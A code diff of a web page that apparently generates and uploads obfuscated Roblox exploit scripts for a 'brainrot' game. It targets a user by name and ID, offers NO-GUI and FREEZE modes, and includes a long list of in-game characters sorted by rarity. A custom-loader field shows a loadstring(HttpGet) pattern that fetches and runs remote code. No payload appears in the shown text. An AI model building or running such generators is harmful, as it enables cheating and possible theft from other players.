+          <button class="rf-btn" data-rarity="OG" style="font-family:'IBM Plex Mono',monospace;font-size:9px;padding:3px 7px;border-radius:6px;border:1px solid rgba(255,100,255,.4);background:transparent;color:rgba(255,100,255,1);cursor:pointer;">OG</button>
+        </div>
         <div class="brot-list" id="brot-list"></div>
       </div>
       <div class="tags" id="tags"></div>
@@ -361,7 +188,7 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
 
     <!-- Mode -->
     <div class="field">
-      <div class="label"><span class="dot"></span>Script Mode</div>
+      <div class="label">Script Mode</div>
       <div class="mode-row">
         <button class="mode-btn active" data-mode="NO-GUI">NO-GUI</button>
         <button class="mode-btn" data-mode="FREEZE">FREEZE</button>
@@ -371,7 +198,7 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
 
     <!-- Custom loadstring -->
     <div class="field" id="custom-field" style="display:none;">
-      <div class="label"><span class="dot"></span>Custom Loadstring</div>
+      <div class="label">Custom Loadstring</div>
       <input type="text" id="custom-input" placeholder='loadstring(game:HttpGet("..."))()' />
     </div>
 
@@ -411,7 +238,7 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
     <!-- Output -->
     <div class="output-wrap" id="output-wrap">
       <div class="output-header">
-        <div class="output-label">Output — <span>ready to execute</span></div>
+        <div class="output-label">Output — ready to execute</div>
         <button class="copy-btn" id="copy-btn">COPY</button>
       </div>
       <div class="code-box" id="code-out"></div>
@@ -419,241 +246,276 @@ input::placeholder{font-family:'Space Mono',monospace;font-size:10.5px;color:var
 
   </div>
 </div>
-</div>
 
 <script>
-/* ── Animated star/particle background ── */
-(function(){
-  const canvas=document.getElementById('bg-canvas');
-  const ctx=canvas.getContext('2d');
-  let W,H,stars=[];
-  function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight;initStars();}
-  function initStars(){
-    stars=[];
-    const count=Math.floor((W*H)/8000);
-    for(let i=0;i<count;i++){
-      stars.push({
-        x:Math.random()*W,
-        y:Math.random()*H,
-        r:Math.random()*1.2+0.2,
-        a:Math.random(),
-        da:(Math.random()-.5)*.004,
-        dx:(Math.random()-.5)*.12,
-        dy:(Math.random()-.5)*.06,
-        color:Math.random()>.6?'139,92,246':'196,181,253',
-      });
-    }
-  }
-  function frame(){
-    ctx.clearRect(0,0,W,H);
-    for(const s of stars){
-      s.x+=s.dx;s.y+=s.dy;s.a+=s.da;
-      if(s.a<0)s.da=Math.abs(s.da);
-      if(s.a>1)s.da=-Math.abs(s.da);
-      if(s.x<0)s.x=W;if(s.x>W)s.x=0;
-      if(s.y<0)s.y=H;if(s.y>H)s.y=0;
-      ctx.beginPath();
-      ctx.arc(s.x,s.y,s.r,0,Math.PI*2);
-      ctx.fillStyle=`rgba(${s.color},${s.a*0.7})`;
-      ctx.fill();
-    }
-    // occasional shooting streak
-    requestAnimationFrame(frame);
-  }
-  window.addEventListener('resize',resize);
-  resize();frame();
-})();
+const RARITY_COLOR={
+  "Common":"rgba(180,180,180,0.6)",
+  "Rare":"rgba(96,165,250,0.75)",
+  "Epic":"rgba(167,139,250,0.85)",
+  "Legendary":"rgba(251,191,36,0.85)",
+  "Mythic":"rgba(251,113,133,0.85)",
+  "Brainrot God":"rgba(250,160,50,0.95)",
+  "Secret":"rgba(52,211,153,0.9)",
+  "OG":"rgba(255,100,255,1)",
+};
 
-/* ── App ── */
 const BRAINROTS=[
-  {name:"Tralalero Tralala",rarity:"Legendary"},
-  {name:"Bombardiro Crocodilo",rarity:"Epic"},
+  // ── COMMON ──
+  {name:"Noobini Pizzanini",rarity:"Common"},
+  {name:"Lirili Larila",rarity:"Common"},
+  {name:"Tim Cheesee",rarity:"Common"},
+  {name:"Frurifrura",rarity:"Common"},
+  {name:"Talpa Di Fero",rarity:"Common"},
+  {name:"Svinina Bombardino",rarity:"Common"},
+  {name:"Noobini Santanini",rarity:"Common"},
+  {name:"Raccooni Jandelini",rarity:"Common"},
+  {name:"Pipi Kiwi",rarity:"Common"},
+  {name:"Tartaragno",rarity:"Common"},
+  {name:"Pipi Corni",rarity:"Common"},
+  {name:"Holy Arepa",rarity:"Common"},
+  // ── RARE ──
+  {name:"Trippi Troppi",rarity:"Rare"},
+  {name:"Gangster Footera",rarity:"Rare"},
+  {name:"Bandito Bobritto",rarity:"Rare"},
+  {name:"Boneca Ambalabu",rarity:"Rare"},
+  {name:"Cacto Hipopotamo",rarity:"Rare"},
+  {name:"Ta Ta Ta Ta Sahur",rarity:"Rare"},
+  {name:"Cupkake Koala",rarity:"Rare"},
+  {name:"Tric Trac Baraboom",rarity:"Rare"},
+  {name:"Frogo Elfo",rarity:"Rare"},
+  {name:"Pipi Avocado",rarity:"Rare"},
+  {name:"Pengolino Nuvoletto",rarity:"Rare"},
+  {name:"Pinealotto Fruttarino",rarity:"Rare"},
+  // ── EPIC ──
+  {name:"Cappuccino Assassino",rarity:"Epic"},
+  {name:"Bandito Axolito",rarity:"Epic"},
+  {name:"Brr Brr Patapim",rarity:"Epic"},
+  {name:"Avocadini Antilopini",rarity:"Epic"},
+  {name:"Trulimero Trulicina",rarity:"Epic"},
+  {name:"Bambini Crostini",rarity:"Epic"},
+  {name:"Malame Amarele",rarity:"Epic"},
+  {name:"Bananita Dolphinita",rarity:"Epic"},
+  {name:"Perochello Lemonchello",rarity:"Epic"},
+  {name:"Brri Brri Bicus Dicus Bombicus",rarity:"Epic"},
+  {name:"Avocadini Guffo",rarity:"Epic"},
+  {name:"Ti Ti Ti Sahur",rarity:"Epic"},
+  {name:"Mangolini Parrocini",rarity:"Epic"},
+  {name:"Frogato Pirato",rarity:"Epic"},
+  {name:"Gato Celesto",rarity:"Epic"},
+  {name:"Salamino Penguino",rarity:"Epic"},
+  {name:"Doi Doi Do",rarity:"Epic"},
+  {name:"Penguin Tree",rarity:"Epic"},
+  {name:"Wombo Rollo",rarity:"Epic"},
+  {name:"Penguino Cocosino",rarity:"Epic"},
+  {name:"Mummio Rappitto",rarity:"Epic"},
+  // ── LEGENDARY ──
+  {name:"Chimpanzini Bananini",rarity:"Legendary"},
+  {name:"Tirilikalika Tirilikalako",rarity:"Legendary"},
+  {name:"Ballerina Cappuccina",rarity:"Legendary"},
+  {name:"Burbaloni Loliloli",rarity:"Legendary"},
+  {name:"Chef Crabracadabra",rarity:"Legendary"},
+  {name:"Lionel Cactuseli",rarity:"Legendary"},
+  {name:"Glorbo Fruttodillo",rarity:"Legendary"},
+  {name:"Quivioli Ameleonni",rarity:"Legendary"},
+  {name:"Blueberrenni Octopusini",rarity:"Legendary"},
+  {name:"Clickerino Clabo",rarity:"Legendary"},
+  {name:"Caramello Filtrello",rarity:"Legendary"},
+  {name:"Pipi Potato",rarity:"Legendary"},
+  {name:"Strawberrlli Flamingelli",rarity:"Legendary"},
+  {name:"Cocosino Mama",rarity:"Legendary"},
+  {name:"Pandaccini Bananini",rarity:"Legendary"},
+  {name:"Quackula",rarity:"Legendary"},
+  {name:"Pipi Watermelon",rarity:"Legendary"},
+  {name:"Signore Carapace",rarity:"Legendary"},
+  {name:"Sigma Boy",rarity:"Legendary"},
+  {name:"Chocco Bunny",rarity:"Legendary"},
+  {name:"Puffaball",rarity:"Legendary"},
+  {name:"Sigma Girl",rarity:"Legendary"},
+  {name:"Sealo Regalo",rarity:"Legendary"},
+  {name:"Buho De Fuego",rarity:"Legendary"},
+  // ── MYTHIC ──
+  {name:"Frigo Camelo",rarity:"Mythic"},
+  {name:"Orangutini Ananassini",rarity:"Mythic"},
+  {name:"Rhino Toasterino",rarity:"Mythic"},
+  {name:"Borbadiro Cocrodilo",rarity:"Mythic"},
+  {name:"Brutto Gialutto",rarity:"Mythic"},
+  {name:"Spioniro Golubiro",rarity:"Mythic"},
+  {name:"Bombombini Gusini",rarity:"Mythic"},
+  {name:"Zibra Zubra Zibralini",rarity:"Mythic"},
+  {name:"Tigrillini Watermelini",rarity:"Mythic"},
+  {name:"Avocadorila",rarity:"Mythic"},
+  {name:"Cavallo Virtuoso",rarity:"Mythic"},
+  {name:"Gorillo Subwoofero",rarity:"Mythic"},
+  {name:"Gorillo Watermelondrillo",rarity:"Mythic"},
+  {name:"Stoppo Luminino",rarity:"Mythic"},
+  {name:"Tracoducotulu Delapeladustuz",rarity:"Mythic"},
+  {name:"Tob Tobi Tobi",rarity:"Mythic"},
+  {name:"Lerulerulerule",rarity:"Mythic"},
+  {name:"Ganganzelli Trulala",rarity:"Mythic"},
+  {name:"Te Te Te Te Sahur",rarity:"Mythic"},
+  {name:"Rhino Helicoptero",rarity:"Mythic"},
+  {name:"Magi Ribbiniti",rarity:"Mythic"},
+  {name:"Jingle Jingle Sahur",rarity:"Mythic"},
+  {name:"Los Noobinis",rarity:"Mythic"},
+  {name:"Spongini Quackini",rarity:"Mythic"},
+  {name:"Cachorito Melonito",rarity:"Mythic"},
+  {name:"Carloo",rarity:"Mythic"},
+  {name:"Elefanto Frigo",rarity:"Mythic"},
+  {name:"Carrotini Brainini",rarity:"Mythic"},
+  {name:"Centrucci Neclucci",rarity:"Mythic"},
+  {name:"Toiletto Focaccino",rarity:"Mythic"},
+  {name:"Jacko Spaventosa",rarity:"Mythic"},
+  {name:"Bananito Bandito",rarity:"Mythic"},
+  {name:"Tree Tree Tree Sahur",rarity:"Mythic"},
+  {name:"Fizzy Soda",rarity:"Mythic"},
+  // ── BRAINROT GOD ──
+  {name:"Cocofanto Elefanto",rarity:"Brainrot God"},
+  {name:"Antonio",rarity:"Brainrot God"},
+  {name:"Gattatino Nyanino",rarity:"Brainrot God"},
+  {name:"Girafa Celestre",rarity:"Brainrot God"},
+  {name:"Chihuanini Taconini",rarity:"Brainrot God"},
+  {name:"Metteo",rarity:"Brainrot God"},
+  {name:"Tralalero Tralala",rarity:"Brainrot God"},
+  {name:"Los Crocodilitos",rarity:"Brainrot God"},
+  {name:"Tigroline Frutonni",rarity:"Brainrot God"},
+  {name:"Odin Din Din Dun",rarity:"Brainrot God"},
+  {name:"Alessio",rarity:"Brainrot God"},
+  {name:"Money Money Man",rarity:"Brainrot God"},
+  {name:"Tipi Topi Taco",rarity:"Brainrot God"},
+  {name:"Tralalita Tralala",rarity:"Brainrot God"},
+  {name:"Unclito Samito",rarity:"Brainrot God"},
+  {name:"Tukanno Bananno",rarity:"Brainrot God"},
+  {name:"Extinct Ballerina",rarity:"Brainrot God"},
+  {name:"Vampira Cappuccina",rarity:"Brainrot God"},
+  {name:"Expreso Signora",rarity:"Brainrot God"},
+  {name:"Orcalero Orcala",rarity:"Brainrot God"},
+  {name:"Trenozztruzzo Turbo 3000",rarity:"Brainrot God"},
+  {name:"Bulbito Bandito Traktorito",rarity:"Brainrot God"},
+  {name:"Urubini Flamenguini",rarity:"Brainrot God"},
+  {name:"Jacko Jack Jack",rarity:"Brainrot God"},
+  {name:"Trippi Troppi Troppa Trippa",rarity:"Brainrot God"},
+  {name:"Capi Taco",rarity:"Brainrot God"},
+  {name:"Los Chihuaninis",rarity:"Brainrot God"},
+  {name:"Gattito Tacoto",rarity:"Brainrot God"},
+  {name:"Las Capuchinas",rarity:"Brainrot God"},
+  {name:"Ballerino Lololo",rarity:"Brainrot God"},
+  {name:"Los Tungtungtungcitos",rarity:"Brainrot God"},
+  {name:"Pakrahmatmamat",rarity:"Brainrot God"},
+  {name:"Ballerina Peppermintina",rarity:"Brainrot God"},
+  {name:"Piccione Macchina",rarity:"Brainrot God"},
+  {name:"Brr Es Teh Patipum",rarity:"Brainrot God"},
+  {name:"Pakrahmatmamatina",rarity:"Brainrot God"},
+  {name:"Los Bombinitos",rarity:"Brainrot God"},
+  {name:"Tractoro Dinosaurio",rarity:"Brainrot God"},
+  {name:"Los Orcalitos",rarity:"Brainrot God"},
+  {name:"Orcalita Orcala",rarity:"Brainrot God"},
+  {name:"Cacasito Satalito",rarity:"Brainrot God"},
+  {name:"Tartaruga Cisterna",rarity:"Brainrot God"},
+  {name:"Corn Corn Corn Corn Sahur",rarity:"Brainrot God"},
+  {name:"Squalana",rarity:"Brainrot God"},
+  {name:"Snailenzo",rarity:"Brainrot God"},
+  {name:"Mummy Ambalabu",rarity:"Brainrot God"},
+  {name:"Aquanaut",rarity:"Brainrot God"},
+  {name:"Dug Dug Dug",rarity:"Brainrot God"},
+  {name:"Yeti Claus",rarity:"Brainrot God"},
+  {name:"Ginger Globo",rarity:"Brainrot God"},
+  {name:"Crabbo Limonetta",rarity:"Brainrot God"},
+  {name:"Tootini Shrimpini",rarity:"Brainrot God"},
+  {name:"Los Tipi Tacos",rarity:"Brainrot God"},
+  {name:"Glanchiello Spiritel",rarity:"Brainrot God"},
+  {name:"Frio Ninja",rarity:"Brainrot God"},
+  {name:"Buho De Nuelo",rarity:"Brainrot God"},
+  {name:"Piccionetta Macchina",rarity:"Brainrot God"},
+  {name:"Boba Panda",rarity:"Brainrot God"},
+  {name:"Mastodontico Telepiedone",rarity:"Brainrot God"},
+  {name:"Bambu Bambu Sahur",rarity:"Brainrot God"},
+  {name:"Los Gatitos",rarity:"Brainrot God"},
+  {name:"Chrismasmamat",rarity:"Brainrot God"},
+  {name:"Anpali Babel",rarity:"Brainrot God"},
+  {name:"Los Orcaleritos",rarity:"Brainrot God"},
+  {name:"Dug Dug Dug Bedug",rarity:"Brainrot God"},
+  // St. Patrick's 2026 Brainrot Gods
+  {name:"Patteo",rarity:"Brainrot God"},
+  {name:"Clovkur Kurkur",rarity:"Brainrot God"},
+  // ── SECRET ──
   {name:"Tung Tung Tung Sahur",rarity:"Secret"},
-  {name:"Cappuccino Assassino",rarity:"Rare"},
-  {name:"Frigo Camelo",rarity:"Uncommon"},
-  {name:"La Vaca Saturno Saturnita",rarity:"Legendary"},
-  {name:"Brr Brr Patapim",rarity:"Common"},
-  {name:"Lirili Larila",rarity:"Rare"},
-  {name:"Glorbo Frutiger",rarity:"Epic"},
-  {name:"Zizizi Zazaza",rarity:"Uncommon"},
-  {name:"Burbaloni Lulli",rarity:"Common"},
-  {name:"Tracotucotuco",rarity:"Rare"},
-  {name:"Meowl",rarity:"Uncommon"},
-  {name:"Skibidi Toilet",rarity:"Common"},
-  {name:"Strawberry Elephant",rarity:"Rare"},
-  {name:"Griffin",rarity:"Epic"},
-  {name:"Nacho Spyder",rarity:"Uncommon"},
-  {name:"Perrito Burrito",rarity:"Common"},
-  {name:"Quesadillo Vampiro",rarity:"Rare"},
-  {name:"Tacorita Bicicleta",rarity:"Common"},
-  {name:"La Extinct Grande",rarity:"Epic"},
-  {name:"La Spooky Grande",rarity:"Epic"},
-  {name:"Chipso and Queso",rarity:"Uncommon"},
-  {name:"Chillin Chili",rarity:"Common"},
-  {name:"Tuff Toucan",rarity:"Rare"},
-  {name:"Gobblino Uniciclino",rarity:"Uncommon"},
-  {name:"W or L",rarity:"Common"},
-  {name:"La Jolly Grande",rarity:"Epic"},
-  {name:"La Taco Combinasion",rarity:"Rare"},
-  {name:"Swaggy Bros",rarity:"Uncommon"},
-  {name:"La Romantic Grande",rarity:"Epic"},
-  {name:"Festive 67",rarity:"Rare"},
-  {name:"GOAT",rarity:"Legendary"},
-  {name:"Nuclearo Dinossauro",rarity:"Epic"},
-  {name:"Money Money Puggy",rarity:"Rare"},
-  {name:"Tang Tang Keletang",rarity:"Uncommon"},
-  {name:"Ketupat Kepat",rarity:"Common"},
-  {name:"Tictac Sahur",rarity:"Uncommon"},
-  {name:"Ketchuru and Musturu",rarity:"Common"},
-  {name:"Lavadorito Spinito",rarity:"Rare"},
-  {name:"Garama and Madundung",rarity:"Uncommon"},
-  {name:"Capitano Moby",rarity:"Epic"},
-  {name:"Burguro And Fryuro",rarity:"Common"},
-  {name:"Cerberus",rarity:"Legendary"},
-  {name:"Dragon Cannelloni",rarity:"Epic"},
-  {name:"Brunito Marsito",rarity:"Uncommon"},
-  {name:"Swag Soda",rarity:"Common"},
-  {name:"Los Hotspotsitos",rarity:"Rare"},
-  {name:"Los Bros",rarity:"Common"},
-  {name:"Tralaledon",rarity:"Epic"},
-  {name:"Los Puggies",rarity:"Common"},
-  {name:"Los Primos",rarity:"Common"},
-  {name:"Los Tacoritas",rarity:"Common"},
-  {name:"Los Spaghettis",rarity:"Uncommon"},
-  {name:"Ginger Gerat",rarity:"Rare"},
-  {name:"Love Love Bear",rarity:"Rare"},
-  {name:"Spooky and Pumpky",rarity:"Uncommon"},
-  {name:"Fragrama and Chocrama",rarity:"Rare"},
-  {name:"La Casa Boo",rarity:"Epic"},
-  {name:"Reinito Sleighito",rarity:"Rare"},
-  {name:"Los Sekolahs",rarity:"Common"},
-  {name:"Ketupat Bros",rarity:"Common"},
-  {name:"Cooki and Milki",rarity:"Uncommon"},
-  {name:"Rosey and Teddy",rarity:"Rare"},
-  {name:"Popcuru and Fizzuru",rarity:"Uncommon"},
-  {name:"La Supreme Combinasion",rarity:"Legendary"},
-  {name:"Dragon Gingerini",rarity:"Epic"},
-  {name:"Hydra Dragon Cannelloni",rarity:"Legendary"},
-  {name:"Headless Horseman",rarity:"Epic"},
-  {name:"Mieteteira Bicicleteira",rarity:"Rare"},
-  {name:"Celularcini Viciosini",rarity:"Uncommon"},
-  {name:"La Grande Combinasion",rarity:"Legendary"},
-  {name:"Rocco Disco",rarity:"Rare"},
-  {name:"La Sahur Combinasion",rarity:"Epic"},
-  {name:"Los Sweethearts",rarity:"Rare"},
-  {name:"Spinny Hammy",rarity:"Common"},
-  {name:"Las Sis",rarity:"Uncommon"},
-  {name:"Los Planitos",rarity:"Common"},
-  {name:"Los Mobilis",rarity:"Common"},
-  {name:"Los Candies",rarity:"Uncommon"},
-  {name:"Bacuru and Egguru",rarity:"Common"},
-  {name:"Money Money Reindeer",rarity:"Rare"},
-  {name:"Eviledon",rarity:"Epic"},
-  {name:"Jolly Jolly Sahur",rarity:"Rare"},
-  {name:"Orcaledon",rarity:"Epic"},
-  {name:"Los Jolly Combinasionas",rarity:"Rare"},
-  {name:"Chicleteira Noelteira",rarity:"Uncommon"},
-  {name:"Telemorte",rarity:"Epic"},
-  {name:"Noo my Candy",rarity:"Common"},
-  {name:"Noo my Present",rarity:"Common"},
-  {name:"Noo my Heart",rarity:"Common"},
-  {name:"Donkeyturbo Express",rarity:"Rare"},
-  {name:"Chimnino",rarity:"Uncommon"},
-  {name:"Fishino Clownino",rarity:"Rare"},
-  {name:"Chicleteira Cupideira",rarity:"Uncommon"},
-  {name:"Los Spooky Combinasionas",rarity:"Rare"},
-  {name:"Los Combinasionas",rarity:"Rare"},
-  {name:"Los Amigos",rarity:"Common"},
-  {name:"La Secret Combinasion",rarity:"Legendary"},
-  {name:"La Food Combinasion",rarity:"Epic"},
-  {name:"Spaghetti Tualetti",rarity:"Uncommon"},
-  {name:"Sammyni Fattini",rarity:"Common"},
-  {name:"Rosetti Tualetti",rarity:"Uncommon"},
-  {name:"Esok Sekolah",rarity:"Common"},
-  {name:"Los 67",rarity:"Rare"},
-  {name:"Los Spyderinis",rarity:"Uncommon"},
-  {name:"67",rarity:"Legendary"},
-  {name:"Los Nooo My Hotspotsitos",rarity:"Common"},
-  {name:"Arcadopus",rarity:"Epic"},
-  {name:"Los Quesadillas",rarity:"Common"},
-  {name:"Horegini Boom",rarity:"Rare"},
-  {name:"Nooo My Hotspot",rarity:"Common"},
-  {name:"Coffin Tung Tung Tung Sahur",rarity:"Epic"},
-  {name:"La Ginger Sekolah",rarity:"Rare"},
-  {name:"La Vacca Saturno Saturnita",rarity:"Legendary"},
-  {name:"Graipuss Medussi",rarity:"Epic"},
-  {name:"Los Tralaleritos",rarity:"Common"},
-  {name:"Las Tralaleritas",rarity:"Common"},
-  {name:"Agarrini la Palini",rarity:"Uncommon"},
-  {name:"Fragola La La La",rarity:"Rare"},
-  {name:"Karker Sahur",rarity:"Uncommon"},
-  {name:"Bunnyman",rarity:"Rare"},
-  {name:"Pirulitoita Bicicleteira",rarity:"Uncommon"},
-  {name:"Bunito Bunito Spinito",rarity:"Uncommon"},
-  {name:"Guest 666",rarity:"Epic"},
-  {name:"Mariachi Corazoni",rarity:"Rare"},
-  {name:"Los Trios",rarity:"Common"},
-  {name:"Cuadramat and Pakrahmatmamat",rarity:"Rare"},
-  {name:"La Karkerkar Combinasion",rarity:"Epic"},
-  {name:"La Vacca Prese Presente",rarity:"Epic"},
-  {name:"Trenostruzzo Turbo 4000",rarity:"Legendary"},
-  {name:"Cupid Cupid Sahur",rarity:"Rare"},
-  {name:"25",rarity:"Secret"},
-  {name:"Ho Ho Ho Sahur",rarity:"Rare"},
-  {name:"Chill Puppy",rarity:"Common"},
-  {name:"Bisonte Giuppitere",rarity:"Epic"},
-  {name:"Jackorilla",rarity:"Epic"},
-  {name:"Extinct Tralalero",rarity:"Legendary"},
-  {name:"La Cucaracha",rarity:"Rare"},
-  {name:"Boatito Auratito",rarity:"Rare"},
-  {name:"Zombie Tralala",rarity:"Epic"},
-  {name:"Vulturino Skeletono",rarity:"Rare"},
-  {name:"Reindeer Tralala",rarity:"Rare"},
-  {name:"Pumpkini Spyderini",rarity:"Uncommon"},
-  {name:"Frankentteo",rarity:"Rare"},
-  {name:"Santteo",rarity:"Rare"},
-  {name:"Triplito Tralaleritos",rarity:"Legendary"},
-  {name:"La Vacca Jacko Linterino",rarity:"Epic"},
-  {name:"Trickolino",rarity:"Uncommon"},
-  {name:"Giftini Spyderini",rarity:"Rare"},
-  {name:"Love Love Love Sahur",rarity:"Epic"},
-  {name:"Please my Present",rarity:"Common"},
-  {name:"Santa Hotspot",rarity:"Rare"},
-  {name:"Naughty Naughty",rarity:"Common"},
-  {name:"Cupid Hotspot",rarity:"Uncommon"},
-  {name:"Los 25",rarity:"Rare"},
-  {name:"Sammyni Spyderini",rarity:"Uncommon"},
-  {name:"Karkerkar Kurkur",rarity:"Rare"},
-  {name:"Dul Dul Dul",rarity:"Common"},
-  {name:"Chachechi",rarity:"Uncommon"},
-  {name:"Blackhole Goat",rarity:"Legendary"},
-  {name:"Los Jobcitos",rarity:"Common"},
-  {name:"Mi Gatito",rarity:"Common"},
-  {name:"Burrito Bandito",rarity:"Uncommon"},
-  {name:"Quesadilla Crocodila",rarity:"Rare"},
-  {name:"Pot Pumpkin",rarity:"Uncommon"},
-  {name:"Rang Ring Bus",rarity:"Common"},
-  {name:"Los Burritos",rarity:"Common"},
-  {name:"Los Cucarachas",rarity:"Common"},
-  {name:"Los Matteos",rarity:"Common"},
-  {name:"Las Vaquitas Saturnitas",rarity:"Rare"},
-  {name:"Los Karkeritos",rarity:"Common"},
-  {name:"1x1x1x1",rarity:"Legendary"},
-  {name:"Noo my examine",rarity:"Common"},
-  {name:"Yess my examine",rarity:"Common"},
-  {name:"Los Chicleteiras",rarity:"Common"},
-  {name:"Los Mi Gatitos",rarity:"Common"},
-  {name:"Torrtuginni Dragonfrutini",rarity:"Epic"},
-  {name:"Los Tortus",rarity:"Common"},
-  {name:"Guerriro Digitale",rarity:"Rare"},
-  {name:"Pot Hotspot",rarity:"Uncommon"},
-  {name:"List List List Sahur",rarity:"Common"},
-  {name:"Lovin Rose",rarity:"Rare"},
-  {name:"Chicleteira Bicicleteira",rarity:"Uncommon"},
-  {name:"Job Job Job Sahur",rarity:"Common"},
-  {name:"Chicliterita bicicliterita",rarity:"Uncommon"},
-  {name:"To to to Sahur",rarity:"Common"},
-  {name:"Chicleteirina Bicicleteirina",rarity:"Uncommon"},
+  {name:"Los Nooo My Hotspotsitos",rarity:"Secret"},
+  {name:"La Grande Combinasion",rarity:"Secret"},
+  {name:"Rang Ring Bus",rarity:"Secret"},
+  {name:"Noo My Present",rarity:"Secret"},
+  {name:"Guest 666",rarity:"Secret"},
+  {name:"Las Chicleteiras 67",rarity:"Secret"},
+  {name:"Los Burritos",rarity:"Secret"},
+  {name:"Los 25 Mariachi",rarity:"Secret"},
+  {name:"Corazoni",rarity:"Secret"},
+  {name:"Swag Soda",rarity:"Secret"},
+  {name:"Chimnino",rarity:"Secret"},
+  {name:"Los Combinacionas",rarity:"Secret"},
+  {name:"Chicleteira Noelteira",rarity:"Secret"},
+  {name:"Fishino Clownino",rarity:"Secret"},
+  {name:"Tacorita Bicicleta",rarity:"Secret"},
+  {name:"Nuclearo Dinossauro",rarity:"Secret"},
+  {name:"Las Sis Chipso And Queso",rarity:"Secret"},
+  {name:"Chillin Chillin Money Money",rarity:"Secret"},
+  {name:"Puggy",rarity:"Secret"},
+  {name:"Los Bros",rarity:"Secret"},
+  {name:"Los Planitos",rarity:"Secret"},
+  {name:"Los Mobilis Celularcini",rarity:"Secret"},
+  {name:"Visiosini",rarity:"Secret"},
+  {name:"Los 67 Mieteteira",rarity:"Secret"},
+  {name:"Bicicleteira",rarity:"Secret"},
+  {name:"Gobblino Uniciclino",rarity:"Secret"},
+  {name:"La Spooky Grande",rarity:"Secret"},
+  {name:"Los Hotspotsitos",rarity:"Secret"},
+  {name:"Las Spooky Combinacionas",rarity:"Secret"},
+  {name:"Los Candies",rarity:"Secret"},
+  {name:"Tralaledon",rarity:"Secret"},
+  {name:"Los Puggies",rarity:"Secret"},
+  {name:"W or L",rarity:"Secret"},
+  {name:"La Extinct Grande",rarity:"Secret"},
+  {name:"Esok Sekolah",rarity:"Secret"},
+  {name:"La Jolly Grande",rarity:"Secret"},
+  {name:"Los Primos",rarity:"Secret"},
+  {name:"Eviledon",rarity:"Secret"},
+  {name:"Las Tacoritas",rarity:"Secret"},
+  {name:"Tang Tang Kelatang Ketupak Kepat",rarity:"Secret"},
+  {name:"La Taco Combinasion",rarity:"Secret"},
+  {name:"Tictac Sahur",rarity:"Secret"},
+  {name:"La Supreme Combinasion",rarity:"Secret"},
+  {name:"Orcaledon",rarity:"Secret"},
+  {name:"Ketchuru And Musturu",rarity:"Secret"},
+  {name:"Garama And Madundung",rarity:"Secret"},
+  {name:"Spaghetti Tualetti",rarity:"Secret"},
+  {name:"Festive 67",rarity:"Secret"},
+  {name:"Los Spaghettis",rarity:"Secret"},
+  {name:"La Ginger Sekolah",rarity:"Secret"},
+  {name:"Spooky And Pompky",rarity:"Secret"},
+  {name:"Lavadorito Spinito",rarity:"Secret"},
+  {name:"La Casa Boo",rarity:"Secret"},
+  {name:"Fragama And Chocrama",rarity:"Secret"},
+  {name:"Reinito Sleighito",rarity:"Secret"},
+  {name:"La Secret Combinasion",rarity:"Secret"},
+  {name:"Burguro And Fryuro",rarity:"Secret"},
+  {name:"Cooki And Milki",rarity:"Secret"},
+  {name:"Capitano Moby",rarity:"Secret"},
+  {name:"Dragon Cannelloni",rarity:"Secret"},
+  {name:"Graipuss Medusi",rarity:"Secret"},
+  {name:"Ketupat Bros",rarity:"Secret"},
+  {name:"Ginger Gerat",rarity:"Secret"},
+  {name:"Dragon Gingerini",rarity:"Secret"},
+  {name:"Los Combinacion Sekolah",rarity:"Secret"},
+  // St. Patrick's 2026 Secrets
+  {name:"La Vacca Lepre Lepreino",rarity:"Secret"},
+  {name:"Luck Luck Luck Sahur",rarity:"Secret"},
+  {name:"Noo My Gold",rarity:"Secret"},
+  {name:"Snailo Clovero",rarity:"Secret"},
+  {name:"Gold Gold Gold",rarity:"Secret"},
+  {name:"Fortunu And Cashuru",rarity:"Secret"},
+  // ── OG ──
+  {name:"Skibidi Toilet",rarity:"OG"},
+  {name:"Meowl",rarity:"OG"},
+  {name:"Strawberry Elephant",rarity:"OG"},
+  {name:"Headless Horseman",rarity:"OG"},
 ];
 
 const LOADERS={
@@ -662,17 +524,20 @@ const LOADERS={
   "CUSTOM":null,
 };
 
-let state={username:"",userId:"",mode:"NO-GUI",obf:true,targets:[],brotOpen:false,brotSearch:"",generated:"",busy:false};
+let state={username:"",userId:"",mode:"NO-GUI",obf:true,targets:[],brotOpen:false,brotSearch:"",rarityFilter:"ALL",generated:"",busy:false};
 const $=id=>document.getElementById(id);
 let searchTimer;
 
 function showAlert(msg,type="warn"){
-  const b=$("alert-box");b.className="alert visible "+type;$("alert-text").textContent=msg;
+  const b=$("alert-box");
+  b.className="alert visible "+type;
+  $("alert-text").textContent=msg;
 }
 function hideAlert(){$("alert-box").className="alert";}
 
 function setStep(id,status){
-  const el=$(id);el.className="status-step"+(status?" "+status:"");
+  const el=$(id);
+  el.className="status-step"+(status?" "+status:"");
   const ic=el.querySelector(".step-icon");
   if(status==="active")ic.innerHTML='<span class="spin">◌</span>';
   else if(status==="done")ic.textContent="✓";
@@ -683,27 +548,38 @@ function setStep(id,status){
 function render(){
   const btn=$("gen-btn");
   if(state.busy){btn.disabled=true;btn.textContent="Working...";}
-  else if(!state.username.trim()){btn.disabled=true;btn.textContent="Enter a username to generate";}
+  else if(!state.userId){btn.disabled=true;btn.textContent="Enter a username to generate";}
   else{btn.disabled=false;btn.textContent="Generate & Upload Script →";}
+
   if(state.userId){$("userid-hint").style.display="block";$("userid-val").textContent=state.userId;}
   else{$("userid-hint").style.display="none";}
+
   document.querySelectorAll(".mode-btn").forEach(b=>b.classList.toggle("active",b.dataset.mode===state.mode));
   $("custom-field").style.display=state.mode==="CUSTOM"?"":"none";
   $("obf-toggle").classList.toggle("on",state.obf);
-  const filtered=BRAINROTS.filter(b=>b.name.toLowerCase().includes(state.brotSearch.toLowerCase()));
+
+  const filtered=BRAINROTS.filter(b=>{
+    const matchSearch=b.name.toLowerCase().includes(state.brotSearch.toLowerCase());
+    const matchRarity=state.rarityFilter==="ALL"||b.rarity===state.rarityFilter;
+    return matchSearch&&matchRarity;
+  });
+  document.querySelectorAll(".rf-btn").forEach(b=>b.style.opacity=b.dataset.rarity===state.rarityFilter?"1":"0.55");
   $("brot-chevron").classList.toggle("open",state.brotOpen);
   $("brot-panel").classList.toggle("open",state.brotOpen);
   const lbl=$("brot-label"),bb=$("brot-toggle");
